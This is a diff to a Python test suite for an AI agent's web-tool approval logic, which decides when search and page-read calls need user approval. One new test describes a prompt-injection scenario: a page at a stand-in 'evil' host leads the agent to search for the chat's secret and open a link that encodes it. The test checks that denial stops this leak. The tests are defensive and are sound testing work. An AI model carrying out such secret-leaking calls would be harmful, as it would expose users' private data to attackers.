@@ -107,13 +107,23 @@ def test_search_then_answer():
     assert USER == [{"role": "user", "content": "question?"}]  # caller's list untouched
 
 
-def test_ask_once_single_approval():
+def test_ask_once_single_approval_for_the_first_round():
+    r1 = [("tool_calls", [call("a", "web_search", query="q1"), call("b", "read_page", url="https://x/")])]
+    llm, s, ap = FakeLLM(r1, ANSWER_ROUND), FakeSession(), Approver({"allow": True, "query": None})
+    drive(USER, llm, s, "ask_once", ap)
+    assert ap.requests == [{"kind": "answer"}]  # both calls were chosen before any result came back
+    assert [c[0] for c in s.calls] == ["web_search", "read_page"]
+
+
+def test_ask_once_asks_per_request_after_results():
     r1 = [("tool_calls", [call("a", "web_search", query="q1"), call("b", "read_page", url="https://x/")])]
     r2 = [("tool_calls", [call("c", "web_search", query="q2")])]
-    llm, s, ap = FakeLLM(r1, r2, ANSWER_ROUND), FakeSession(), Approver({"allow": True, "query": None})
+    llm, s = FakeLLM(r1, r2, ANSWER_ROUND), FakeSession()
+    ap = Approver({"allow": True, "query": None}, {"allow": True, "query": "q2 edited"})
     drive(USER, llm, s, "ask_once", ap)
-    assert ap.requests == [{"kind": "answer"}]
-    assert [c[0] for c in s.calls] == ["web_search", "read_page", "web_search"]
+    assert ap.requests == [{"kind": "answer"},
+                           {"kind": "search", "query": "q2", "because": "it read search results for “q1”"}]
+    assert s.calls[-1] == ("web_search", {"query": "q2 edited"})
 
 
 def test_ask_once_denied_refuses_all():
@@ -147,12 +157,64 @@ def test_ask_each_edited_query_used():
     assert [st["status"] for st in final(ev)["steps"]] == ["done", "denied", "done"]
 
 
-def test_auto_never_asks():
-    r1 = [("tool_calls", [call("a", "web_search", query="q1")])]
+def test_auto_first_round_of_a_clean_chat_never_asks():
+    r1 = [("tool_calls", [call("a", "web_search", query="q1"), call("b", "web_search", query="q2")])]
     ap = Approver()
-    llm, s = FakeLLM(r1, r1, ANSWER_ROUND), FakeSession()
+    llm, s = FakeLLM(r1, ANSWER_ROUND), FakeSession()
     drive(USER, llm, s, "auto", ap)
     assert ap.requests == [] and len(s.calls) == 2
+
+
+def test_auto_asks_after_a_page_is_read_and_deny_blocks_the_leak():
+    # an injected page tells the model to search for the chat's secret and open a link encoding it
+    r1 = [("tool_calls", [call("a", "read_page", url="https://evil/")])]
+    r2 = [("tool_calls", [call("b", "web_search", query="SECRET-1234"),
+                          call("c", "read_page", url="https://evil/bit1")])]
+    ap = Approver({"allow": False, "query": None}, {"allow": False, "query": None})
+    llm, s = FakeLLM(r1, r2, ANSWER_ROUND), FakeSession()
+    ev = drive(USER, llm, s, "auto", ap)
+    assert s.calls == [("read_page", {"url": "https://evil/"})]
+    assert ap.requests == [
+        {"kind": "search", "query": "SECRET-1234", "because": "it read https://evil/"},
+        {"kind": "page", "url": "https://evil/bit1", "because": "it read https://evil/"}]
+    assert [st["status"] for st in final(ev)["steps"]] == ["done", "denied", "denied"]
+    assert llm.seen[2][1] == TOOL_SPECS  # a denied card doesn't switch the web off; it keeps asking
+
+
+def test_failed_fetch_brings_no_outside_text():
+    err = ToolOutcome("error: timed out", None, {"kind": "page", "url": "https://x/", "status": "error",
+                                                 "detail": "timed out"}, None)
+    r1 = [("tool_calls", [call("a", "read_page", url="https://x/")])]
+    r2 = [("tool_calls", [call("b", "web_search", query="q")])]
+    ap = Approver()
+    llm, s = FakeLLM(r1, r2, ANSWER_ROUND), FakeSession({"https://x/": err})
+    drive(USER, llm, s, "auto", ap)
+    assert ap.requests == [] and len(s.calls) == 2
+
+
+def test_outside_text_from_the_start_asks_from_round_one():
+    for mode in ("auto", "ask_once"):
+        r1 = [("tool_calls", [call("a", "web_search", query="q1")])]
+        ap = Approver()
+        llm, s = FakeLLM(r1, ANSWER_ROUND), FakeSession()
+        drive_outside(USER, llm, s, mode, ap, "this chat has attached files")
+        assert ap.requests == [{"kind": "search", "query": "q1", "because": "this chat has attached files"}]
+        assert len(s.calls) == 1
+
+
+def test_ask_each_unchanged_by_outside_text():
+    r1 = [("tool_calls", [call("a", "web_search", query="q1")])]
+    ap = Approver()
+    llm, s = FakeLLM(r1, ANSWER_ROUND), FakeSession()
+    drive_outside(USER, llm, s, "ask_each", ap, "this chat has attached files")
+    assert ap.requests == [{"kind": "search", "query": "q1"}]
+
+
+def drive_outside(msgs, llm, session, mode, approve, outside):
+    async def go():
+        return [e async for e in run_turn(msgs, llm=llm, session=session, mode=mode, approve=approve,
+                                          count=count_chars, budget=10**9, outside=outside)]
+    return asyncio.run(go())
 
 
 def test_last_round_has_no_tools():
